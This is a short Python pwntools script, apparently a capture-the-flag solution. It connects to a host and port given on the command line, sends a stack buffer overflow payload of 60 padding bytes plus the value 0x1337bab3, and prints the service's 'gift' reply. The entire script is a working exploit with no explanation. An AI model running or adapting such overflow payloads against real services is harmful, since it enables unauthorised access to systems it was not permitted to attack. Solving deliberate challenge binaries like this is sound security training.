#!/usr/bin/env python3

from pwn import *
import sys

def exploit(io):
    payload = b"A"*60 + p64(0x1337bab3)
    io.sendline(payload)
    io.recvuntil(b"Here's a small gift: ")
    print(io.recv().decode())


def main():
    HOST, PORT = sys.argv[1].split(":")
    io = remote(HOST, PORT)
    exploit(io)

if __name__ == "__main__":
    main()
